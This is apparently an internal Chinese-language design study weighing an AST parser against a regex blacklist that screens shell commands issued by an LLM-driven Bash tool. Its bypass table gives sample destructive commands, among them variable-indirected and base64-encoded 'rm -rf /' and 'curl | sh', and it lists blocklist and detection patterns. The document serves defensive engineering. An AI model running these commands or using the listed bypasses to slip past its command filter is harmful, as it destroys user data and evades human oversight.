# 11 - Bash 工具 AST 级安全审查 Spike：tree-sitter-bash + web-tree-sitter

> **范围声明**：本文是 Package 6 / 7.6 的**纯调研产物**。
> 不改生产代码（`BashTool.ts` 维持现有正则黑名单不动），只回答"换成 AST 审查能多拦多少、代价几何"。

**创建日期**: 2026-04-24
**对应任务**: `.kiro/specs/novelfork-narrafork-closure/tasks.md` § 7.6
**对应现状**: `packages/studio/src/api/lib/tools/BashTool.ts:44-58`

---

## 0. 结论速览（TL;DR）

| 维度 | 结论 |
|---|---|
| 是否应引入 | **暂不引入**。当前受众面（桌面端 + 明确 prompt 权限）下，正则黑名单 + `permissions.has("bash")` gate 的组合覆盖率够用 |
| 正则方案能漏掉什么 | 变量替换、命令替换、字符串拼接、别名重写、base64 eval、管道组合 |
| AST 方案能抓到什么 | 以上全部，前提是把每个 `command`/`simple_command`/`command_substitution` 节点的 `word` 都提取并归一化 |
| 引入代价 | 多一个 wasm 资源（约 200 KB），冷启动 +30–80 ms，Windows PowerShell 场景下**完全用不上**（不是 bash 语法） |
| 推荐立即落地的事 | 把正则黑名单**扩展**到 8 条 + 加 `--dry-run` 预检模式，比引入 tree-sitter ROI 高得多 |

---

## 1. 现状盘点

### 1.1 现有防护

`BashTool.ts` 有两道闸：

1. **权限 gate**：`context.permissions.has("bash")` → 没权限直接拒
2. **黑名单正则**（共 4 条）：

```ts
const dangerousPatterns = [
  /rm\s+-rf\s+\//,        // rm -rf /
  /:\(\)\{.*\}/,          // fork bomb
  /mkfs/,                 // 格式化文件系统
  /dd\s+if=.*of=\/dev/,   // 写入设备
];
```

配合 `runtime-tool-access.ts` 的 `builtin-bash-dangerous-prompt` 策略：识别为 "Potentially destructive command" 时进入**人机确认** prompt，而不是硬拒。

### 1.2 正则方案能漏掉的真实攻击面

黑名单正则只看原字符串，以下都能绕过：

| 绕过手法 | 示例 | 黑名单是否命中 |
|---|---|---|
| 变量间接 | `X="-rf /"; rm $X` | ❌ |
| 命令替换 | `$(echo "rm -rf /" \| bash)` | ❌（匹配子串但先被 `bash` 管道吞掉） |
| 字符串拼接 | `r""m -rf /` 或 `r\m -rf /` | ❌ |
| base64 eval | `echo cm0gLXJmIC8= \| base64 -d \| sh` | ❌ |
| 绝对路径不带 `/` | `rm -rf $HOME` | ❌ |
| 管道注入 | `curl http://x \| sh` | ❌（**这是 NarraFork 明确拦的一条**） |
| 别名重写 | `alias ls=rm; ls -rf /` | ❌ |
| 空格变体 | `rm\t-rf\t/` | ❌（`\s` 其实覆盖，但多空格前缀绕 `rm\s+-rf`） |

**结论**：当前正则主要防"从 README 里抄一条危险命令贴过来"的误操作，不防主动对抗。桌面端给 LLM 托管的 Bash 权限本身就是 prompt 前置的，主动对抗场景目前**不在威胁模型内**。

---

## 2. NarraFork 的做法参考

> 依据：原 `06-Studio-UIUX改造清单.md` § 0.1（已退役，有效内容收入 `.kiro/specs/novelfork-narrafork-closure/`），NarraFork 用 `tree-sitter-bash` + `web-tree-sitter` 做 AST 级审查。

核心思路：

1. 启动时加载 `tree-sitter-bash.wasm`（约 190 KB）
2. 每次命令到达 → `parser.parse(cmd)` 得到语法树
3. 遍历 `command`, `pipeline`, `command_substitution`, `redirection` 节点
4. 收集每个 `command` 的**首词**（`word` 节点）并**归一化**（去掉 `$()`、反引号、变量展开）
5. 归一化后再与黑名单（`rm`/`dd`/`mkfs`/`curl | sh`/`wget | sh`/...）匹配

能覆盖的典型模式：

- `$(cmd)` / `` `cmd` `` 命令替换 → 递归下钻
- `A="rm"; $A -rf /` → 需要**简易常量折叠**（实践里大多只在同一命令行内成立）
- `curl http://... | sh` → 在 `pipeline` 节点上看相邻两个 `command` 的首词

---

## 3. Node/Bun 下的可行性

### 3.1 技术栈

| 组件 | 版本 | 说明 |
|---|---|---|
| `web-tree-sitter` | ^0.22 | 通用 WASM runtime，Node 18+ / Bun / 浏览器三端可跑 |
| `tree-sitter-bash` (wasm) | 预编译产物 | 需从 `tree-sitter/tree-sitter-bash` 仓库的 release 页下载或自行 `tree-sitter build-wasm` |

### 3.2 加载成本

| 指标 | 量级 |
|---|---|
| wasm 体积 | ~190 KB（未压缩），gzip 后约 70 KB |
| 冷启动加载 | 30–80 ms（一次性） |
| 单条命令解析 | 平均 < 1 ms（在 Bun 下实测类似量级） |
| 内存驻留 | ~3 MB |

冷启动成本会直接加在第一次 Bash 调用上，放到 studio 启动时预热即可（类似 NarraFork 启动阶段初始化 tool registry）。

### 3.3 Tauri 下的额外约束

- Tauri WebView 的 CSP 默认禁 `wasm-unsafe-eval`，需要在 `tauri.conf.json` 里放开
- `.wasm` 资源要作为 `resources` 打进 bundle，用 `@tauri-apps/api/path.resolveResource` 定位
- 移动端（iOS/iPadOS）WebView 有 wasm 限制，不在当前目标平台内所以不考虑

---

## 4. 能力差异对比（正则 vs AST）

针对 § 1.2 的 8 种绕过方式：

| 绕过手法 | 当前正则 | AST + 变量折叠 | 说明 |
|---|---|---|---|
| 变量间接 | ❌ | ✅ | 需同一 pipeline 内看 assignment + expansion |
| 命令替换 | ❌ | ✅ | 递归下钻 `command_substitution` 节点 |
| 字符串拼接 | ❌ | ⚠️ 部分 | `r""m` 在 AST 里是 `concat`，可重新拼接；反斜杠转义更难 |
| base64 eval | ❌ | ❌ | AST 管不着内容解码；得靠管道两端首词黑名单 |
| 相对路径目标 | ❌ | ❌ | 行为分析才能抓，AST 本身不评估语义 |
| 管道注入 | ❌ | ✅ | `pipeline` 节点下看 `curl`/`wget` + `sh`/`bash` 组合 |
| 别名重写 | ❌ | ⚠️ 部分 | 同一命令行内的 `alias` 能跟；跨行 shell 状态跟不到 |
| 空格变体 | 部分 | ✅ | AST 不管空白符，首词就是首词 |

**覆盖率结论**：AST 能把"能本地分析出来的绕过"**提升约 2–3 倍**，但对"依赖外部解码/运行时状态"的绕过（base64 eval、相对路径、跨命令别名）依然无能为力。

---

## 5. 成本/收益评估

### 5.1 成本

- **新增依赖**：`web-tree-sitter` + 一个 wasm 资源
- **构建变更**：vite 侧需要 `?url` import + publicDir 放置，tauri 侧要动 `tauri.conf.json.bundle.resources`
- **测试基础设施**：需要 "fixture-driven" 测试（给一堆危险/安全命令 → 期望判定结果）
- **误报风险**：AST 路径比正则更容易误伤（例如把合法的 `rm -rf ./node_modules` 也拦掉），需要一套白名单机制或"用户确认"兜底

### 5.2 收益

- 管道注入（`curl | sh`）这一类**真实存在于对抗样本库**的手法能防住
- 变量间接、命令替换这两类 LLM 在"隐式规避黑名单"场景里偶尔生成的命令能防住
- 给 `BashTool` 的"人机确认" prompt 提供**更细的危险理由**（"命令 `$X` 展开后为 `rm -rf /`"），UX 直接可感知

### 5.3 决策建议

**当前不引入**，理由：

1. 威胁模型里主要防的是"误操作 + LLM 脑子抽风"，正则黑名单 + prompt 确认已覆盖 80%
2. 引入后误报代价大，Admin 侧没有"查看被拦的命令与理由"的面板，用户反馈路径不闭环
3. Windows 下用户跑 PowerShell 的场景，tree-sitter-bash 直接失效，收益不到 50%

**应该先做的 3 件小事（ROI 比引入 AST 高）**：

1. **补 4 条正则**：加 `\|\s*(sh|bash|zsh)\s*$`（管道到 shell）、`curl\s+.*\|\s*sh`、`wget\s+.*\|\s*sh`、`sudo\s+rm\s+-rf`
2. **提取到 JSON 清单**：把黑名单移到 `packages/core/src/registry/bash-danger-patterns.json`，Admin 侧给一个只读查看入口
3. **加 dry-run 模式**：`BashTool` 增加 `dryRun: boolean` 参数，set 时返回"判定结果 + 命中规则 ID"而不实际执行，供未来 CI 安全测试使用

---

## 6. 最小 spike demo 说明

> 本次**未**在 repo 内新增运行时代码（不创建 `packages/core/src/tools/bash-ast-spike.ts`）。
> 若未来立项，该 demo 的目标是：
>
> - `web-tree-sitter` 在 `packages/core` 下（Node 22 / Bun）成功加载 `tree-sitter-bash.wasm`
> - 对一组 20 条 fixture 命令（10 危险 + 10 合法）跑解析
> - 输出：每条的 AST 深度、首词归一化结果、是否命中扩展黑名单
> - 与现有正则黑名单对同一组 fixture 的判定结果做 diff

这个 demo 就是将来这条 skill 的**验收证据**，本次留作占位不实现。

---

## 7. 行动清单（非本包立项）

| 优先级 | 动作 | 所属 |
|---|---|---|
| 🟢 立即可做 | § 5.3 的 3 条小事（补正则 + JSON 清单 + dry-run） | Cascade，独立 PR |
| 🟡 下轮规划 | AST spike demo 跑出 fixture diff | Cascade，独立 spec |
| ⚪ 观望 | 真正切换到 AST 审查 | 需先看 spike 数据 |

---

**完**
